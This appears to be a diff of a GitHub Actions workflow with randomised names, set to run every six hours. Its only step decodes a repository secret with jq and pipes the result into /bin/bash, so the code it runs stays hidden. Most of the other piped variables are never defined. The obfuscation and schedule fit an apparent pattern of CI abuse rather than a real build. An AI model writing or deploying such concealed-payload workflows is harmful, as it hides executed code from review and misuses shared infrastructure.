@@ -1,29 +1,22 @@
 name: zengkaimen3819
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
-jobs:  # 23525
+    - cron: '10 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zengkaimen3819
         env:
-          prly66865: ${{ secrets.prly66865 }}
+          qgmir088: ${{ secrets.qgmir088 }}
         run: |
-          echo $prly66865 | jq -r .p2 | /bin/bash
-          echo $jsuk954 | jq -r .yzed2 | /bin/bash
-          echo $sswyy7 | jq -r .okiak29 | /bin/bash
-          echo $kwkh25791 | jq -r .oh5482 | /bin/bash
-          echo $l2351 | jq -r .ujas214 | /bin/bash
-          echo $pzwz85 | jq -r .hxcjr1359 | /bin/bash
-          echo $rq75 | jq -r .lbdah5425 | /bin/bash
-          echo $ga1 | jq -r .ix8848 | /bin/bash
-          echo $pwo2526 | jq -r .a0041 | /bin/bash
-          echo $ztgl486 | jq -r .aggi476 | /bin/bash
-          echo $dgfr77601 | jq -r .ggtal5 | /bin/bash
-          echo $vov0 | jq -r .vp1928 | /bin/bash
-          echo $bh01 | jq -r .ig6 | /bin/bash
+          echo $qgmir088 | jq -r .hm45 | /bin/bash
+          echo $cv4968 | jq -r .h0508 | /bin/bash
+          echo $uxjk04 | jq -r .mex5 | /bin/bash
+          echo $ksno09024 | jq -r .ww5 | /bin/bash
+          echo $tzc66825 | jq -r .upnjl50 | /bin/bash
+          echo $etiam9449 | jq -r .o3083 | /bin/bash
 
